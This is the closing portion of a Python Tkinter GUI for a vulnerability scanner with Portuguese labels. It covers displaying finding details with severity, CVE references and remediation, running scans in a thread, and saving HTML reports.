                     f"📊 Severidade: {v.severity} | CVSS: {v.cvss_score}\n"
                     f"📁 Categoria: {v.category}\n"
                     f"🕐 {v.timestamp}\n\n"
                     f"📋 DESCRIÇÃO:\n{v.description}\n\n"
                     f"🔍 EVIDÊNCIA:\n{v.evidence}\n\n"
                     f"⚔️ COMO EXPLORAR:\n{v.exploit_info}\n\n"
                     f"🛡️ COMO CORRIGIR:\n{v.remediation}\n")

                if v.cves:
                    d += f"\n{'='*50}\n📌 CVE RELACIONADAS ({len(v.cves)}):\n{'='*50}\n"
                    for cve in v.cves:
                        d += (f"\n  🔹 {cve['id']} (CVSS: {cve['score']})\n"
                              f"     {cve['description']}\n"
                              f"     🔗 {cve['url']}\n")

                self.detail.insert('1.0', d)
                self.detail.config(state='disabled')
                break

    def start_scan(self):
        target = self.target_entry.get().strip()
        if not target or target == 'exemplo.com.br':
            messagebox.showwarning("Atenção", "Digite o domínio!\nExemplo: businesscorp.com.br")
            return
        if self.is_scanning: return

        self.clear_log()
        self.tree.delete(*self.tree.get_children())
        self.detail.config(state='normal')
        self.detail.delete('1.0', tk.END)
        self.detail.config(state='disabled')
        for var in self.stat_vars.values(): var.set("0")
        self.vuln_count.set("0")
        self.progress_var.set(0)
        self.progress_label.config(text="0%", fg=self.accent)
        self.module_var.set("")

        self.is_scanning = True
        self.scan_btn.state(['disabled'])
        self.stop_btn.state(['!disabled'])
        self.save_btn.state(['disabled'])
        self.status_var.set(f"🔄 Escaneando {target}...")

        self.scanner = VulnerabilityScanner(
            callback=self.log_msg,
            progress_callback=self.progress_update
        )
        threading.Thread(target=self._run, args=(target,), daemon=True).start()

    def _run(self, target):
        try:
            self.scanner.full_scan(target)
        except Exception as e:
            self.log_msg(f"[ERROR] Fatal: {str(e)}")
        finally:
            self.root.after(0, self._complete)

    def _complete(self):
        self.is_scanning = False
        self.scan_btn.state(['!disabled'])
        self.stop_btn.state(['disabled'])
        self.save_btn.state(['!disabled'])
        self.progress_var.set(100)
        self.progress_label.config(text="100%", fg='#3fb950')

        total = len(self.scanner.vulnerabilities)
        total_cves = len(set(c['id'] for v in self.scanner.vulnerabilities for c in v.cves))
        self.status_var.set(f"✅ {total} vulns | {total_cves} CVE")
        self.module_var.set("Completo!")
        self._update_tree()

        if total > 0:
            messagebox.showinfo("Completo",
                                f"Scan finalizado!\n\n"
                                f"🔍 {total} vulnerabilidades\n"
                                f"📌 {total_cves} CVE referenciadas\n\n"
                                f"Clique 'HTML' para gerar relatório.")

    def stop_scan(self):
        if self.scanner:
            self.scanner.stop_scan = True
            self.status_var.set("⛔ Parando...")

    def save_report(self):
        if not self.scanner or not self.scanner.vulnerabilities:
            messagebox.showwarning("", "Execute o scan primeiro")
            return
        domain = self.scanner.scan_info.get('domain', 'scan')
        fn = f"vulnscan_{domain}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
        filename = filedialog.asksaveasfilename(
            defaultextension=".html",
            filetypes=[("HTML","*.html")],
            initialfile=fn, title="Salvar Relatório"
        )
        if filename:
            try:
                HTMLReportGenerator.generate(self.scanner.scan_info,
                                              self.scanner.vulnerabilities, filename)
                self.status_var.set(f"💾 {filename}")
                import webbrowser
                webbrowser.open(f'file://{os.path.abspath(filename)}')
            except Exception as e:
                messagebox.showerror("Erro", str(e))

    def clear_log(self):
        self.log_text.config(state='normal')
        self.log_text.delete('1.0', tk.END)
        self.log_text.config(state='disabled')

    def run(self):
        self.root.mainloop()


# ==================== MAIN ====================

def main():
    app = VulnScanGUI()
    app.run()

if __name__ == "__main__":
    main()
